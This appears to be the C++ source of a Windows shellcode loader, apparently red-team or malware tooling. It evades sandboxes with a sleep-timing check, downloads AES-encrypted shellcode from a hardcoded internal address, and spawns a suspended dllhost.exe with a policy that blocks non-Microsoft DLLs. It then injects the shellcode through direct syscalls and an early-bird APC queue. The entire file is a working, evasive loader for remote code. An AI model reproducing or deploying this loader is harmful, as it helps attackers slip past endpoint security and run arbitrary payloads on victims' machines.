#include <windows.h>
#include <wininet.h>
#include <vector>
#include <iostream>
#include <chrono>
#include <thread>
#include "syscalls.h"
#include "decrypt.h"


int main() {
    NTSTATUS status;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOEXA si = { 0 };
    SIZE_T attributeSize = 0;

    auto start = std::chrono::system_clock::now();
    std::this_thread::sleep_for(std::chrono::seconds(5));
    auto end = std::chrono::system_clock::now();
    std::chrono::duration<double> elapsed_seconds = end - start;
    if (elapsed_seconds.count() <= 4.5) {
        exit(0);
    }

    std::string url = "http://172.17.0.1/api.enc";
    std::string cle_hex = "22c1fd9683459d5afdc3e9dd2b652864";
    std::string iv_hex = "d9651462022f4b00a29183f7b0321f70";
    std::vector<BYTE> sc = DownloadAndDecryptShellcode(url, cle_hex, iv_hex);

    unsigned char* shellcode = &sc[0];
    SIZE_T shellcode_size = sc.size();
    std::cout << "[*] Shellcode size: " << shellcode_size << " bytes" << std::endl;

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);
    InitializeProcThreadAttributeList(attributes, 1, 0, &attributeSize);

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    si.lpAttributeList = attributes;


    if (!CreateProcessA(
        "C:\\Windows\\System32\\dllhost.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        NULL,
        NULL,
        &si.StartupInfo,
        &pi
    )) {
        std::cerr << "[-] CreateProcess failed: 0x" << std::hex << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "[+] Process created in suspended state" << std::endl;
    std::cout << "[+] PID: " << std::dec << pi.dwProcessId << std::endl;
    std::cout << "[+] Handle: 0x" << std::hex << pi.hProcess << std::endl;

    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);


    LPVOID pRemoteMemory = VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (pRemoteMemory == NULL) {
        std::cerr << "VirtualAllocEx failed. Error: " << GetLastError() << "\n";
        CloseHandle(pi.hProcess);
        return 1;
    }

    std::cout << "Successfully allocated memory at address: " << pRemoteMemory << "\n";

    SIZE_T bytesWritten = 0;
    status = Sw3NtWriteVirtualMemory(
        pi.hProcess,
        (PVOID)pRemoteMemory,
        (PVOID)shellcode,
        shellcode_size,
        &bytesWritten
    );

    if (status == 0) {
        std::cout << "Successfully Write shellcode at address: " << bytesWritten << "\n";
    }
    else {
        std::cout << "Failed to Write shellcode. Status: 0x" << std::hex << status << std::dec << std::endl;
    }

    ULONG oldProtect;
    status = Sw3NtProtectVirtualMemory(
        pi.hProcess,
        &pRemoteMemory,
        &shellcode_size,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (status == 0) {
        std::cout << "Memory Read-Execute success" << std::endl;
    }
    else {
        std::cout << "Failed to change Memory Read-Execute. Status: 0x" << std::hex << status << std::dec << std::endl;
    }


    status = Sw3NtQueueApcThread(
        pi.hThread,
        (PKNORMAL_ROUTINE)pRemoteMemory,
        0,
        0,
        0
    );

    if (status == 0) {
        std::cout << "QueueUserAPC success" << std::endl;
    }
    else {
        std::cout << "Failed to QueueUserAPC. Status: 0x" << std::hex << status << std::dec << std::endl;
    }

    Sw3NtResumeThread(pi.hThread, 0);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
